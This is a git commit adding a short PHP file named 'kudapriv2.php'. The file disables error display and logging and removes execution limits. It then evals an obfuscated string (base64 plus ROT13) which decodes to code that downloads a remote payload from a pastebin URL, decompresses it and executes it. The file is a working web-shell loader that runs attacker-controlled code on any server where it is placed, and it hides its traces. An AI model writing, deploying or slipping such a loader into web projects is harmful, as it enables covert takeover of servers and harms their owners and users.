2012757d4cdf062982f19ff50cdafbb5dd5a7983
mrxbarakuda <32748674+mrxbarakuda@users.noreply.github.com>
2018-06-10 06:43:15 +0700

    Add files via upload

---
+++ kudapriv2.php
@@ -0,0 +1,16 @@
+<?php
+// https://pastebin.com/raw/61HesRtk
+session_start();
+error_reporting(0);
+set_time_limit(0);
+date_default_timezone_set('Asia/Jakarta');
+@set_magic_quotes_runtime(0);
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors',0);
+$kudagans = 'cmlueSh0bXZhc3luZ3Iob25mcjY0X3FycGJxcihzdnlyX3RyZ19wYmFncmFnZigndWdnY2Y6Ly9jbmZncm92YS5wYnovZW5qL08yZzNzdW93JykpKSk7';error_reporting(0);@set_time_limit(0);
+eval(str_rot13(base64_decode($kudagans)));
+?>
